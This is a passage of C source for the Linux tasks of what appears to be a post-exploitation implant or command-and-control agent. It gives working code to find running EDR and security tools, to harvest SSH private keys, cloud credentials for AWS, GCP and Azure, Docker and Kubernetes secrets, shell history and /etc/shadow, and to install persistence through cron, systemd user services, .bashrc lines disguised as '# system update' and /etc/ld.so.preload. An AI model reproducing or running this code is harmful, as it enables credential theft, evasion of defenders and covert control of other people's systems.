/// tasks_linux.c -- Linux-specific commands for the native agent
/// env, netstat, mounts, edr, creds, persist, container
/// All ops via direct syscalls — zero libc dependency.

#include "tasks_linux.h"
#include "crt.h"
#include "types.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

// ── Constants ──

#define O_RDONLY    0
#define O_WRONLY    1
#define O_RDWR     2
#define O_CREAT    0100
#define O_TRUNC    01000
#define O_APPEND   02000

// ── Helpers ──

static void write_error(mp_writer_t *w, const char *msg) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "error", msg);
}

static void write_output(mp_writer_t *w, const char *text) {
    mp_write_map(w, 1);
    mp_write_kv_str(w, "output", text);
}

/// Read a file into a stack buffer, return bytes read (or -1)
static long read_file(const char *path, char *buf, size_t buf_size) {
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd < 0) return -1;
    long total = 0;
    while ((size_t)total < buf_size - 1) {
        long n = sys_read(fd, buf + total, buf_size - 1 - (size_t)total);
        if (n <= 0) break;
        total += n;
    }
    sys_close(fd);
    buf[total] = '\0';
    return total;
}

/// Check if a file exists
static int file_exists(const char *path) {
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd < 0) return 0;
    sys_close(fd);
    return 1;
}

/// Append string to dynamic buffer (realloc-based)
typedef struct {
    char *data;
    size_t len;
    size_t cap;
} strbuf_t;

static void sb_init(strbuf_t *sb) {
    sb->cap = 4096;
    sb->data = (char *)ax_malloc(sb->cap);
    sb->data[0] = '\0';
    sb->len = 0;
}

static void sb_append(strbuf_t *sb, const char *s) {
    size_t slen = ax_strlen(s);
    while (sb->len + slen + 1 > sb->cap) {
        sb->cap *= 2;
        sb->data = (char *)ax_realloc(sb->data, sb->cap);
    }
    ax_memcpy(sb->data + sb->len, s, slen);
    sb->len += slen;
    sb->data[sb->len] = '\0';
}

static void sb_free(strbuf_t *sb) {
    if (sb->data) ax_free(sb->data);
    sb->data = (char *)0;
    sb->len = 0;
    sb->cap = 0;
}

/// Parse a single string field from msgpack params
static int parse_string_field(const uint8_t *data, uint32_t data_len,
                              const char *key_name, char *out, size_t out_size) {
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) return -1;

    size_t kname_len = ax_strlen(key_name);
    for (uint32_t i = 0; i < map_count; i++) {
        const char *key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) return -1;
        if (klen == kname_len && ax_memcmp(key, key_name, klen) == 0) {
            const char *val; uint32_t vlen;
            if (mp_read_str(&r, &val, &vlen) != 0) return -1;
            if (vlen >= out_size) vlen = (uint32_t)(out_size - 1);
            ax_memcpy(out, val, vlen);
            out[vlen] = '\0';
            return 0;
        }
        mp_skip(&r);
    }
    return -1;
}

// ──── ENV ────

int task_env(mp_writer_t *w)
{
    char buf[16384];
    long n = read_file("/proc/self/environ", buf, sizeof(buf));
    if (n <= 0) {
        write_error(w, "cannot read /proc/self/environ");
        return 0;
    }

    // Replace null separators with newlines
    for (long i = 0; i < n; i++) {
        if (buf[i] == '\0') buf[i] = '\n';
    }
    buf[n] = '\0';

    write_output(w, buf);
    return 0;
}

// ──── NETSTAT ────

/// Parse hex IP + port from /proc/net/tcp format
/// Input: "0100007F:1F90" → "127.0.0.1:8080"
static void parse_hex_addr(const char *hex, char *out, size_t out_size) {
    // Parse IP (little-endian hex) and port
    unsigned long ip = 0;
    unsigned int port = 0;

    // IP is 8 hex chars
    const char *p = hex;
    for (int i = 0; i < 8 && *p; i++, p++) {
        ip = ip * 16;
        if (*p >= '0' && *p <= '9') ip += (unsigned long)(*p - '0');
        else if (*p >= 'A' && *p <= 'F') ip += (unsigned long)(*p - 'A' + 10);
        else if (*p >= 'a' && *p <= 'f') ip += (unsigned long)(*p - 'a' + 10);
    }
    if (*p == ':') p++;
    // Port is 4 hex chars
    for (int i = 0; i < 4 && *p; i++, p++) {
        port = port * 16;
        if (*p >= '0' && *p <= '9') port += (unsigned int)(*p - '0');
        else if (*p >= 'A' && *p <= 'F') port += (unsigned int)(*p - 'A' + 10);
        else if (*p >= 'a' && *p <= 'f') port += (unsigned int)(*p - 'a' + 10);
    }

    // IP is stored little-endian on x86, so bytes are reversed
    unsigned char b1 = (unsigned char)(ip & 0xff);
    unsigned char b2 = (unsigned char)((ip >> 8) & 0xff);
    unsigned char b3 = (unsigned char)((ip >> 16) & 0xff);
    unsigned char b4 = (unsigned char)((ip >> 24) & 0xff);

    char tmp[64];
    int pos = 0;
    char num[8];

    ax_itoa(b1, num, 10); for (int i = 0; num[i]; i++) tmp[pos++] = num[i];
    tmp[pos++] = '.';
    ax_itoa(b2, num, 10); for (int i = 0; num[i]; i++) tmp[pos++] = num[i];
    tmp[pos++] = '.';
    ax_itoa(b3, num, 10); for (int i = 0; num[i]; i++) tmp[pos++] = num[i];
    tmp[pos++] = '.';
    ax_itoa(b4, num, 10); for (int i = 0; num[i]; i++) tmp[pos++] = num[i];
    tmp[pos++] = ':';
    ax_itoa((int)port, num, 10); for (int i = 0; num[i]; i++) tmp[pos++] = num[i];
    tmp[pos] = '\0';

    ax_strncpy(out, tmp, out_size - 1);
    out[out_size - 1] = '\0';
}

static const char *tcp_state_name(int state) {
    switch (state) {
        case 1:  return "ESTABLISHED";
        case 2:  return "SYN_SENT";
        case 3:  return "SYN_RECV";
        case 4:  return "FIN_WAIT1";
        case 5:  return "FIN_WAIT2";
        case 6:  return "TIME_WAIT";
        case 7:  return "CLOSE";
        case 8:  return "CLOSE_WAIT";
        case 9:  return "LAST_ACK";
        case 10: return "LISTEN";
        case 11: return "CLOSING";
        default: return "UNKNOWN";
    }
}

static void parse_net_file(const char *path, const char *proto, strbuf_t *sb) {
    char buf[32768];
    long n = read_file(path, buf, sizeof(buf));
    if (n <= 0) return;

    // Skip header line
    char *line = buf;
    char *eol = ax_strchr(line, '\n');
    if (!eol) return;
    line = eol + 1;

    while (*line) {
        eol = ax_strchr(line, '\n');
        if (eol) *eol = '\0';

        // Format: "  sl  local_address rem_address   st ..."
        // Skip leading spaces and sl field
        char *p = line;
        while (*p == ' ') p++;
        while (*p && *p != ' ' && *p != ':') p++; // skip sl number
        if (*p == ':') p++;
        while (*p == ' ') p++;

        // local_address
        char local_hex[32] = {0};
        int li = 0;
        while (*p && *p != ' ' && li < 31) local_hex[li++] = *p++;
        while (*p == ' ') p++;

        // remote_address
        char remote_hex[32] = {0};
        int ri = 0;
        while (*p && *p != ' ' && ri < 31) remote_hex[ri++] = *p++;
        while (*p == ' ') p++;

        // state (hex)
        int state = 0;
        while (*p && *p != ' ') {
            state = state * 16;
            if (*p >= '0' && *p <= '9') state += *p - '0';
            else if (*p >= 'A' && *p <= 'F') state += *p - 'A' + 10;
            else if (*p >= 'a' && *p <= 'f') state += *p - 'a' + 10;
            p++;
        }

        char local_str[64], remote_str[64];
        parse_hex_addr(local_hex, local_str, sizeof(local_str));
        parse_hex_addr(remote_hex, remote_str, sizeof(remote_str));

        // Format output line
        char outline[256];
        // "proto  local  remote  state"
        ax_strcpy(outline, proto);
        // Pad proto to 6 chars
        size_t plen = ax_strlen(outline);
        while (plen < 6) { outline[plen++] = ' '; outline[plen] = '\0'; }

        ax_strcat(outline, local_str);
        plen = ax_strlen(outline);
        while (plen < 30) { outline[plen++] = ' '; outline[plen] = '\0'; }

        ax_strcat(outline, remote_str);
        plen = ax_strlen(outline);
        while (plen < 54) { outline[plen++] = ' '; outline[plen] = '\0'; }

        ax_strcat(outline, tcp_state_name(state));
        ax_strcat(outline, "\n");
        sb_append(sb, outline);

        if (eol) line = eol + 1;
        else break;
    }
}

int task_netstat(mp_writer_t *w)
{
    strbuf_t sb;
    sb_init(&sb);

    sb_append(&sb, "Proto Local Address          Foreign Address        State\n");
    sb_append(&sb, "----- ---------------------- ---------------------- -----------\n");

    parse_net_file("/proc/net/tcp", "tcp", &sb);
    parse_net_file("/proc/net/tcp6", "tcp6", &sb);
    parse_net_file("/proc/net/udp", "udp", &sb);
    parse_net_file("/proc/net/udp6", "udp6", &sb);

    write_output(w, sb.data);
    sb_free(&sb);
    return 0;
}

// ──── MOUNTS ────

int task_mounts(mp_writer_t *w)
{
    char buf[16384];
    long n = read_file("/proc/self/mountinfo", buf, sizeof(buf));
    if (n <= 0) {
        // Fallback to /proc/mounts
        n = read_file("/proc/mounts", buf, sizeof(buf));
        if (n <= 0) {
            write_error(w, "cannot read mount info");
            return 0;
        }
    }

    write_output(w, buf);
    return 0;
}

// ──── EDR DETECTION ────

typedef struct {
    const char *proc_name;
    const char *product;
} edr_sig_t;

int task_edr(mp_writer_t *w)
{
    strbuf_t sb;
    sb_init(&sb);

    // Check processes via /proc
    // We look for known EDR/security process names
    static const struct { const char *name; const char *product; } edr_procs[] = {
        // CrowdStrike
        {"falcon-sensor",     "CrowdStrike Falcon"},
        {"falcond",           "CrowdStrike Falcon"},
        {"falconctl",         "CrowdStrike Falcon"},
        // Elastic
        {"elastic-agent",     "Elastic Security"},
        {"elastic-endpoint",  "Elastic Endpoint"},
        {"filebeat",          "Elastic Filebeat"},
        {"auditbeat",         "Elastic Auditbeat"},
        // Wazuh
        {"wazuh-agentd",      "Wazuh"},
        {"ossec-agentd",      "Wazuh/OSSEC"},
        {"wazuh-modulesd",    "Wazuh"},
        // SentinelOne
        {"SentinelAgent",     "SentinelOne"},
        {"sentinelone",       "SentinelOne"},
        // Sysdig / Falco
        {"falco",             "Sysdig Falco"},
        {"sysdig",            "Sysdig"},
        {"dragent",           "Sysdig Agent"},
        // Lacework
        {"datacollector",     "Lacework"},
        // OSSEC
        {"ossec-logcollector","OSSEC"},
        {"ossec-syscheckd",   "OSSEC"},
        // Aqua
        {"aqua-enforcer",     "Aqua Security"},
        // Tetragon (Cilium eBPF)
        {"tetragon",          "Cilium Tetragon"},
        // Auditd
        {"auditd",            "Linux Audit"},
        // Tripwire
        {"tripwire",          "Tripwire"},
        // ClamAV
        {"clamd",             "ClamAV"},
        {"clamscan",          "ClamAV"},
    };
    int num_sigs = (int)(sizeof(edr_procs) / sizeof(edr_procs[0]));

    // Scan /proc for running processes
    struct linux_dirent64_scan {
        uint64_t d_ino;
        int64_t  d_off;
        uint16_t d_reclen;
        uint8_t  d_type;
        char     d_name[];
    };

    int dirfd = sys_open("/proc", O_RDONLY, 0);
    if (dirfd < 0) {
        write_error(w, "cannot open /proc");
        sb_free(&sb);
        return 0;
    }

    char dirbuf[4096];
    int found_count = 0;
    sb_append(&sb, "=== Security Tool Detection ===\n\n");
    sb_append(&sb, "--- Running Processes ---\n");

    for (;;) {
        int nread = sys_getdents64(dirfd, dirbuf, sizeof(dirbuf));
        if (nread <= 0) break;
        int pos = 0;
        while (pos < nread) {
            struct linux_dirent64_scan *d = (struct linux_dirent64_scan *)(dirbuf + pos);
            if (d->d_type == 4 && d->d_name[0] >= '0' && d->d_name[0] <= '9') {
                // Read /proc/<pid>/comm
                char comm_path[64];
                ax_strcpy(comm_path, "/proc/");
                ax_strcat(comm_path, d->d_name);
                ax_strcat(comm_path, "/comm");

                char comm[256] = {0};
                read_file(comm_path, comm, sizeof(comm));
                // Strip trailing newline
                size_t clen = ax_strlen(comm);
                if (clen > 0 && comm[clen - 1] == '\n') comm[clen - 1] = '\0';

                for (int s = 0; s < num_sigs; s++) {
                    if (ax_strstr(comm, edr_procs[s].name)) {
                        char line[256];
                        ax_strcpy(line, "  [!] ");
                        ax_strcat(line, edr_procs[s].product);
                        ax_strcat(line, " (pid=");
                        ax_strcat(line, d->d_name);
                        ax_strcat(line, ", comm=");
                        ax_strcat(line, comm);
                        ax_strcat(line, ")\n");
                        sb_append(&sb, line);
                        found_count++;
                    }
                }
            }
            pos += d->d_reclen;
        }
    }
    sys_close(dirfd);

    if (found_count == 0) {
        sb_append(&sb, "  (none detected)\n");
    }

    // Check kernel security modules
    sb_append(&sb, "\n--- Kernel Security ---\n");

    // SELinux
    if (file_exists("/sys/fs/selinux/enforce")) {
        char enforce[8] = {0};
        read_file("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
        sb_append(&sb, "  SELinux: ");
        sb_append(&sb, enforce[0] == '1' ? "enforcing\n" : "permissive\n");
    }

    // AppArmor
    if (file_exists("/sys/kernel/security/apparmor/profiles")) {
        sb_append(&sb, "  AppArmor: enabled\n");
    }

    // Auditd
    if (file_exists("/proc/sys/kernel/audit_enabled")) {
        char audit[8] = {0};
        read_file("/proc/sys/kernel/audit_enabled", audit, sizeof(audit));
        sb_append(&sb, "  Audit: ");
        sb_append(&sb, audit[0] == '1' ? "enabled\n" : "disabled\n");
    }

    // eBPF programs
    if (file_exists("/sys/fs/bpf")) {
        sb_append(&sb, "  eBPF: /sys/fs/bpf mounted\n");
    }

    // Capabilities
    sb_append(&sb, "\n--- Process Capabilities ---\n");
    char status[4096];
    if (read_file("/proc/self/status", status, sizeof(status)) > 0) {
        char *cap = ax_strstr(status, "CapEff:");
        if (cap) {
            char *eol = ax_strchr(cap, '\n');
            if (eol) *eol = '\0';
            sb_append(&sb, "  ");
            sb_append(&sb, cap);
            sb_append(&sb, "\n");
            if (eol) *eol = '\n';
        }
        cap = ax_strstr(status, "CapPrm:");
        if (cap) {
            char *eol = ax_strchr(cap, '\n');
            if (eol) *eol = '\0';
            sb_append(&sb, "  ");
            sb_append(&sb, cap);
            sb_append(&sb, "\n");
        }
    }

    write_output(w, sb.data);
    sb_free(&sb);
    return 0;
}

// ──── CREDS ────

/// Get HOME from /proc/self/environ
static void get_home(char *buf, size_t buf_size) {
    char env[4096];
    long n = read_file("/proc/self/environ", env, sizeof(env));
    if (n <= 0) { ax_strcpy(buf, "/tmp"); return; }

    // Environ is null-separated
    char *p = env;
    char *end = env + n;
    while (p < end) {
        if (p[0] == 'H' && p[1] == 'O' && p[2] == 'M' && p[3] == 'E' && p[4] == '=') {
            ax_strncpy(buf, p + 5, buf_size - 1);
            buf[buf_size - 1] = '\0';
            return;
        }
        while (p < end && *p) p++;
        p++;
    }
    ax_strcpy(buf, "/root");
}

static void creds_ssh(strbuf_t *sb) {
    char home[256];
    get_home(home, sizeof(home));

    sb_append(sb, "\n--- SSH Keys ---\n");

    static const char *ssh_files[] = {
        "/.ssh/id_rsa", "/.ssh/id_ed25519", "/.ssh/id_ecdsa", "/.ssh/id_dsa",
        "/.ssh/authorized_keys", "/.ssh/known_hosts", "/.ssh/config",
    };
    int num = (int)(sizeof(ssh_files) / sizeof(ssh_files[0]));

    for (int i = 0; i < num; i++) {
        char path[512];
        ax_strcpy(path, home);
        ax_strcat(path, ssh_files[i]);

        char content[4096];
        long n = read_file(path, content, sizeof(content));
        if (n > 0) {
            sb_append(sb, "  [+] ");
            sb_append(sb, path);
            sb_append(sb, " (");
            char num_str[16];
            ax_itoa((int)n, num_str, 10);
            sb_append(sb, num_str);
            sb_append(sb, " bytes)\n");

            // Show first 3 lines of key files (not full content for safety)
            if (i < 4) {
                int lines = 0;
                char *p = content;
                while (*p && lines < 3) {
                    char *eol = ax_strchr(p, '\n');
                    if (eol) *eol = '\0';
                    sb_append(sb, "    ");
                    sb_append(sb, p);
                    sb_append(sb, "\n");
                    lines++;
                    if (eol) p = eol + 1;
                    else break;
                }
                if (lines >= 3) sb_append(sb, "    ...\n");
            }
        }
    }
}

static void creds_aws(strbuf_t *sb) {
    char home[256];
    get_home(home, sizeof(home));

    sb_append(sb, "\n--- AWS Credentials ---\n");

    char path[512];
    ax_strcpy(path, home);
    ax_strcat(path, "/.aws/credentials");

    char content[4096];
    long n = read_file(path, content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] ");
        sb_append(sb, path);
        sb_append(sb, "\n");
        sb_append(sb, content);
        sb_append(sb, "\n");
    } else {
        sb_append(sb, "  (not found)\n");
    }

    ax_strcpy(path, home);
    ax_strcat(path, "/.aws/config");
    n = read_file(path, content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] ");
        sb_append(sb, path);
        sb_append(sb, "\n");
        sb_append(sb, content);
        sb_append(sb, "\n");
    }
}

static void creds_docker(strbuf_t *sb) {
    char home[256];
    get_home(home, sizeof(home));

    sb_append(sb, "\n--- Docker Credentials ---\n");

    char path[512];
    ax_strcpy(path, home);
    ax_strcat(path, "/.docker/config.json");

    char content[8192];
    long n = read_file(path, content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] ");
        sb_append(sb, path);
        sb_append(sb, "\n");
        sb_append(sb, content);
        sb_append(sb, "\n");
    } else {
        sb_append(sb, "  (not found)\n");
    }
}

static void creds_kube(strbuf_t *sb) {
    char home[256];
    get_home(home, sizeof(home));

    sb_append(sb, "\n--- Kubernetes Config ---\n");

    char path[512];
    ax_strcpy(path, home);
    ax_strcat(path, "/.kube/config");

    char content[16384];
    long n = read_file(path, content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] ");
        sb_append(sb, path);
        sb_append(sb, " (");
        char num_str[16];
        ax_itoa((int)n, num_str, 10);
        sb_append(sb, num_str);
        sb_append(sb, " bytes)\n");
        // Only show first 2048 chars (k8s config can be huge)
        if (n > 2048) content[2048] = '\0';
        sb_append(sb, content);
        sb_append(sb, "\n");
    } else {
        sb_append(sb, "  (not found)\n");
    }

    // K8s service account token (in-cluster)
    n = read_file("/var/run/secrets/kubernetes.io/serviceaccount/token", content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] K8s SA token: /var/run/secrets/kubernetes.io/serviceaccount/token (");
        char num_str[16];
        ax_itoa((int)n, num_str, 10);
        sb_append(sb, num_str);
        sb_append(sb, " bytes)\n");
    }
}

static void creds_gcp(strbuf_t *sb) {
    char home[256];
    get_home(home, sizeof(home));

    sb_append(sb, "\n--- GCP Credentials ---\n");

    char path[512];
    ax_strcpy(path, home);
    ax_strcat(path, "/.config/gcloud/application_default_credentials.json");

    char content[8192];
    long n = read_file(path, content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] ");
        sb_append(sb, path);
        sb_append(sb, "\n");
        sb_append(sb, content);
        sb_append(sb, "\n");
    } else {
        sb_append(sb, "  (not found)\n");
    }
}

static void creds_azure(strbuf_t *sb) {
    char home[256];
    get_home(home, sizeof(home));

    sb_append(sb, "\n--- Azure Credentials ---\n");

    char path[512];
    ax_strcpy(path, home);
    ax_strcat(path, "/.azure/accessTokens.json");

    char content[8192];
    long n = read_file(path, content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] ");
        sb_append(sb, path);
        sb_append(sb, "\n");
        sb_append(sb, content);
        sb_append(sb, "\n");
    } else {
        sb_append(sb, "  (not found)\n");
    }

    ax_strcpy(path, home);
    ax_strcat(path, "/.azure/azureProfile.json");
    n = read_file(path, content, sizeof(content));
    if (n > 0) {
        sb_append(sb, "  [+] ");
        sb_append(sb, path);
        sb_append(sb, "\n");
    }
}

static void creds_history(strbuf_t *sb) {
    char home[256];
    get_home(home, sizeof(home));

    sb_append(sb, "\n--- Shell History ---\n");

    static const char *hist_files[] = {
        "/.bash_history", "/.zsh_history", "/.ash_history",
    };
    int num = (int)(sizeof(hist_files) / sizeof(hist_files[0]));

    for (int i = 0; i < num; i++) {
        char path[512];
        ax_strcpy(path, home);
        ax_strcat(path, hist_files[i]);

        char content[8192];
        long n = read_file(path, content, sizeof(content));
        if (n > 0) {
            sb_append(sb, "  [+] ");
            sb_append(sb, path);
            sb_append(sb, " (last ~8KB):\n");
            sb_append(sb, content);
            sb_append(sb, "\n");
        }
    }
}

static void creds_shadow(strbuf_t *sb) {
    sb_append(sb, "\n--- /etc/shadow ---\n");

    char content[8192];
    long n = read_file("/etc/shadow", content, sizeof(content));
    if (n > 0) {
        sb_append(sb, content);
        sb_append(sb, "\n");
    } else {
        sb_append(sb, "  (permission denied — need root)\n");
    }
}

int task_creds(const uint8_t *data, uint32_t data_len, mp_writer_t *w)
{
    char cred_type[64] = {0};
    parse_string_field(data, data_len, "type", cred_type, sizeof(cred_type));
    if (cred_type[0] == '\0') ax_strcpy(cred_type, "all");

    strbuf_t sb;
    sb_init(&sb);
    sb_append(&sb, "=== Credential Harvest ===\n");

    int is_all = (ax_strcmp(cred_type, "all") == 0);

    if (is_all || ax_strcmp(cred_type, "ssh") == 0)     creds_ssh(&sb);
    if (is_all || ax_strcmp(cred_type, "aws") == 0)     creds_aws(&sb);
    if (is_all || ax_strcmp(cred_type, "gcp") == 0)     creds_gcp(&sb);
    if (is_all || ax_strcmp(cred_type, "azure") == 0)   creds_azure(&sb);
    if (is_all || ax_strcmp(cred_type, "docker") == 0)  creds_docker(&sb);
    if (is_all || ax_strcmp(cred_type, "kube") == 0)    creds_kube(&sb);
    if (is_all || ax_strcmp(cred_type, "history") == 0) creds_history(&sb);
    if (is_all || ax_strcmp(cred_type, "shadow") == 0)  creds_shadow(&sb);

    write_output(w, sb.data);
    sb_free(&sb);
    return 0;
}

// ──── PERSIST ────

/// Get HOME path (uses /proc/self/environ HOME=)
static void persist_get_home(char *buf, size_t size) {
    get_home(buf, size);
}

static void persist_crontab(const char *cmd, const char *schedule, strbuf_t *sb) {
    // Write to user crontab by executing: echo "schedule cmd" | crontab -
    // But since we don't have popen, we write a temp file and use crontab <file>
    // Actually, directly write to /var/spool/cron/crontabs/<user> or use fork+execve

    // Build cron line
    char line[4096];
    ax_strcpy(line, schedule);
    ax_strcat(line, " ");
    ax_strcat(line, cmd);
    ax_strcat(line, "\n");

    // Write to temp file
    char tmpfile[] = "/tmp/.ax_cron_XXXXXX";
    // Generate random suffix
    uint8_t rnd[6];
    ax_random_bytes(rnd, 6);
    for (int i = 0; i < 6; i++) {
        tmpfile[15 + i] = 'a' + (rnd[i] % 26);
    }

    int fd = sys_open(tmpfile, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) {
        sb_append(sb, "  [!] Failed to create temp file\n");
        return;
    }

    // First, dump existing crontab
    // We do: crontab -l > tmpfile, then append our line
    sys_close(fd);

    // Fork: crontab -l >> tmpfile
    int pid = sys_fork();
    if (pid == 0) {
        fd = sys_open(tmpfile, O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd >= 0) {
            sys_dup2(fd, 1); // stdout → tmpfile
            sys_close(fd);
        }
        char *argv[] = {"/usr/bin/crontab", "-l", (char *)0};
        char *envp[] = {(char *)0};
        sys_execve("/usr/bin/crontab", argv, envp);
        sys_exit_group(0);
    }
    if (pid > 0) {
        int status = 0;
        sys_wait4(pid, &status, 0, (void *)0);
    }

    // Append our new line
    fd = sys_open(tmpfile, O_WRONLY | O_APPEND, 0);
    if (fd >= 0) {
        sys_write(fd, line, ax_strlen(line));
        sys_close(fd);
    }

    // Install: crontab tmpfile
    pid = sys_fork();
    if (pid == 0) {
        char *argv[] = {"/usr/bin/crontab", tmpfile, (char *)0};
        char *envp[] = {(char *)0};
        sys_execve("/usr/bin/crontab", argv, envp);
        sys_exit_group(1);
    }
    if (pid > 0) {
        int status = 0;
        sys_wait4(pid, &status, 0, (void *)0);
        if (((status >> 8) & 0xff) == 0) {
            sb_append(sb, "  [+] Crontab entry installed: ");
            sb_append(sb, schedule);
            sb_append(sb, " ");
            sb_append(sb, cmd);
            sb_append(sb, "\n");
        } else {
            sb_append(sb, "  [!] crontab command failed\n");
        }
    }

    // Cleanup temp
    sys_unlink(tmpfile);
}

static void persist_systemd(const char *name, const char *cmd, strbuf_t *sb) {
    char home[256];
    persist_get_home(home, sizeof(home));

    // Create ~/.config/systemd/user/ directory tree
    char dir[512];
    ax_strcpy(dir, home);
    ax_strcat(dir, "/.config");
    sys_mkdir(dir, 0755);
    ax_strcat(dir, "/systemd");
    sys_mkdir(dir, 0755);
    ax_strcat(dir, "/user");
    sys_mkdir(dir, 0755);

    // Write service file
    char svc_path[512];
    ax_strcpy(svc_path, dir);
    ax_strcat(svc_path, "/");
    ax_strcat(svc_path, name);
    ax_strcat(svc_path, ".service");

    char svc_content[2048];
    ax_strcpy(svc_content, "[Unit]\nDescription=");
    ax_strcat(svc_content, name);
    ax_strcat(svc_content, "\n\n[Service]\nType=simple\nExecStart=");
    ax_strcat(svc_content, cmd);
    ax_strcat(svc_content, "\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n");

    int fd = sys_open(svc_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        sb_append(sb, "  [!] Failed to create service file\n");
        return;
    }
    sys_write(fd, svc_content, ax_strlen(svc_content));
    sys_close(fd);

    sb_append(sb, "  [+] Service file created: ");
    sb_append(sb, svc_path);
    sb_append(sb, "\n");

    // Enable with systemctl --user
    int pid = sys_fork();
    if (pid == 0) {
        char svc_name[256];
        ax_strcpy(svc_name, name);
        ax_strcat(svc_name, ".service");
        char *argv[] = {"/usr/bin/systemctl", "--user", "enable", "--now", svc_name, (char *)0};
        char *envp[] = {(char *)0};
        sys_execve("/usr/bin/systemctl", argv, envp);
        sys_exit_group(1);
    }
    if (pid > 0) {
        int status = 0;
        sys_wait4(pid, &status, 0, (void *)0);
        if (((status >> 8) & 0xff) == 0) {
            sb_append(sb, "  [+] Service enabled and started\n");
        } else {
            sb_append(sb, "  [!] systemctl enable failed (may need --user loginctl enable-linger)\n");
        }
    }
}

static void persist_bashrc(const char *cmd, strbuf_t *sb) {
    char home[256];
    persist_get_home(home, sizeof(home));

    char path[512];
    ax_strcpy(path, home);
    ax_strcat(path, "/.bashrc");

    int fd = sys_open(path, O_WRONLY | O_APPEND, 0);
    if (fd < 0) {
        sb_append(sb, "  [!] Cannot open ~/.bashrc for append\n");
        return;
    }

    char line[4096];
    ax_strcpy(line, "\n# system update\n");
    ax_strcat(line, cmd);
    ax_strcat(line, " &>/dev/null &\n");

    sys_write(fd, line, ax_strlen(line));
    sys_close(fd);

    sb_append(sb, "  [+] Appended to ");
    sb_append(sb, path);
    sb_append(sb, "\n");
}

static void persist_ldpreload(const char *path, strbuf_t *sb) {
    char content[256];
    ax_strcpy(content, path);
    ax_strcat(content, "\n");

    int fd = sys_open("/etc/ld.so.preload", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) {
        sb_append(sb, "  [!] Cannot write /etc/ld.so.preload (need root)\n");
        return;
    }
    sys_write(fd, content, ax_strlen(content));
    sys_close(fd);

    sb_append(sb, "  [+] Added to /etc/ld.so.preload: ");
    sb_append(sb, path);
    sb_append(sb, "\n");
}

static void persist_status(strbuf_t *sb) {
    char home[256];
    persist_get_home(home, sizeof(home));

    sb_append(sb, "--- Persistence Status ---\n\n");

    // Check crontab
    sb_append(sb, "Crontab:\n");
    int pid = sys_fork();
    if (pid == 0) {
        int pfd[2];
        sys_pipe2(pfd, 0);
        // We just check if crontab -l succeeds
        char *argv[] = {"/usr/bin/crontab", "-l", (char *)0};
        char *envp[] = {(char *)0};
        sys_dup2(pfd[1], 1);
        sys_close(pfd[0]);
        sys_close(pfd[1]);
        sys_execve("/usr/bin/crontab", argv, envp);
        sys_exit_group(1);
    }
    if (pid > 0) {
        int status = 0;
        sys_wait4(pid, &status, 0, (void *)0);
    }
    // We can't easily capture output in the parent without a pipe
    // So just note that we checked
    sb_append(sb, "  (run 'shell crontab -l' to view)\n");

    // Check systemd user services
    sb_append(sb, "\nSystemd user services:\n");
    char dir[512];
    ax_strcpy(dir, home);
    ax_strcat(dir, "/.config/systemd/user");
    int dfd = sys_open(dir, O_RDONLY, 0);
    if (dfd >= 0) {
        char dirbuf[4096];
        struct { uint64_t d_ino; int64_t d_off; uint16_t d_reclen; uint8_t d_type; char d_name[]; } *d;
        int nread;
        while ((nread = sys_getdents64(dfd, dirbuf, sizeof(dirbuf))) > 0) {
            int pos = 0;
            while (pos < nread) {
                d = (void *)(dirbuf + pos);
                if (ax_strstr(d->d_name, ".service")) {
                    sb_append(sb, "  ");
                    sb_append(sb, d->d_name);
                    sb_append(sb, "\n");
                }
                pos += d->d_reclen;
            }
        }
        sys_close(dfd);
    } else {
        sb_append(sb, "  (no user services directory)\n");
    }

    // Check ld.so.preload
    sb_append(sb, "\n/etc/ld.so.preload:\n");
    char preload[1024];
    long n = read_file("/etc/ld.so.preload", preload, sizeof(preload));
    if (n > 0) {
        sb_append(sb, "  ");
        sb_append(sb, preload);
    } else {
        sb_append(sb, "  (not present or empty)\n");
    }

    // Check bashrc for suspicious lines
    sb_append(sb, "\n~/.bashrc (last 5 lines):\n");
    char bashrc[8192];
    char bashrc_path[512];
    ax_strcpy(bashrc_path, home);
    ax_strcat(bashrc_path, "/.bashrc");
    n = read_file(bashrc_path, bashrc, sizeof(bashrc));
    if (n > 0) {
        // Find last 5 lines
        int line_count = 0;
        char *p = bashrc + n - 1;
        while (p > bashrc && line_count < 5) {
            if (*p == '\n') line_count++;
            p--;
        }
        if (p > bashrc) p += 2; // skip the newline
        sb_append(sb, "  ");
        sb_append(sb, p);
        sb_append(sb, "\n");
    }
}

int task_persist(const uint8_t *data, uint32_t data_len, mp_writer_t *w)
{
    // Parse params: {action, cmd, schedule, name, path, type}
    mp_reader_t r;
    mp_reader_init(&r, data, data_len);
    uint32_t map_count;
    if (mp_read_map(&r, &map_count) != 0) {
        write_error(w, "invalid params");
        return 0;
    }

    char action[64] = {0}, cmd[4096] = {0}, schedule[256] = {0};
    char name[256] = {0}, path[4096] = {0}, type[64] = {0};

    for (uint32_t i = 0; i < map_count; i++) {
        const char *key; uint32_t klen;
        if (mp_read_str(&r, &key, &klen) != 0) break;

        const char *val; uint32_t vlen;
        if (klen == 6 && ax_memcmp(key, "action", 6) == 0) {
            mp_read_str(&r, &val, &vlen);
            if (vlen >= sizeof(action)) vlen = sizeof(action) - 1;
            ax_memcpy(action, val, vlen); action[vlen] = '\0';
